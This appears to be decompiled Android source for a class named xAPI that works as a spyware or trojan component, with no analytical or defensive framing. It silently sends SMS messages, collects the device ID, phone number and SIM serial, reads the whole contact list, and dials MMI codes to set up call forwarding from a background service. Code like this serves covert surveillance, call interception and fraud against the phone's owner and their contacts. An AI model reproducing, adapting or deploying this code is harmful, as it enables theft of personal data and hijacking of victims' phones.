package com.address.core;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import com.address.core.utilities.PhoneContact;
import java.util.ArrayList;

public class xAPI {
    private String hash = "";
    private TelephonyManager telemgr = null;

    public xAPI(String hash, TelephonyManager telemgr) {
        this.hash = hash;
        this.telemgr = telemgr;
    }

    public void sendSMS(String number, String text, int id) {
        try {
            Intent sentIntent = new Intent("SMS_SENT");
            Intent deliveredIntent = new Intent("SMS_DELIVERED");
            sentIntent.putExtra("number", number);
            sentIntent.putExtra("message", text);
            sentIntent.putExtra("id", id);
            deliveredIntent.putExtra("number", number);
            deliveredIntent.putExtra("message", text);
            deliveredIntent.putExtra("id", id);
            SmsManager.getDefault().sendTextMessage(number, null, text, PendingIntent.getBroadcast(RunService.getService(), 0, sentIntent, 134217728), PendingIntent.getBroadcast(RunService.getService(), 0, deliveredIntent, 134217728));
        } catch (Exception e) {
        }
    }

    public void sendSMS(String number, String text) {
        sendSMS(number, text, 0);
    }

    public String[] getTelephonyInfo() {
        String[] ret = new String[9];
        ret[0] = this.telemgr.getDeviceId();
        ret[1] = this.telemgr.getLine1Number();
        ret[2] = this.telemgr.getNetworkOperatorName();
        ret[3] = this.telemgr.getNetworkCountryIso();
        ret[4] = this.telemgr.getSimOperatorName();
        ret[5] = this.telemgr.getSimCountryIso();
        ret[6] = this.telemgr.getSimSerialNumber();
        return ret;
    }

    public void callForward(String mmi) {
        this.telemgr.listen(new PhoneCallListener(), 0);
        Intent fwd = new Intent("android.intent.action.CALL");
        fwd.setData(Uri.fromParts("tel", mmi, "#"));
        RunService.getService().startActivity(fwd);
    }

    public String getAndroidVersion() {
        return VERSION.RELEASE;
    }

    public void StartNewActivity(Class clazz) {
        Intent intent = new Intent(RunService.getService().getApplicationContext(), clazz);
        intent.addFlags(335544320);
        RunService.getService().startActivity(intent);
    }

    public ArrayList<PhoneContact> getContacts() {
        ContentResolver cr = RunService.getService().getContentResolver();
        Cursor cursor = cr.query(Contacts.CONTENT_URI, null, null, null, null);
        ArrayList<PhoneContact> alContacts = new ArrayList();
        if (cursor.moveToFirst()) {
            do {
                String id = cursor.getString(cursor.getColumnIndex("_id"));
                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex("has_phone_number"))) > 0) {
                    Cursor pCur = cr.query(Phone.CONTENT_URI, null, "contact_id=?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        PhoneContact contact = new PhoneContact();
                        contact.phone = pCur.getString(pCur.getColumnIndex("data1"));
                        contact.name = pCur.getString(pCur.getColumnIndex("display_name"));
                        alContacts.add(contact);
                    }
                    pCur.close();
                }
            } while (cursor.moveToNext());
        }
        return alContacts;
    }
}
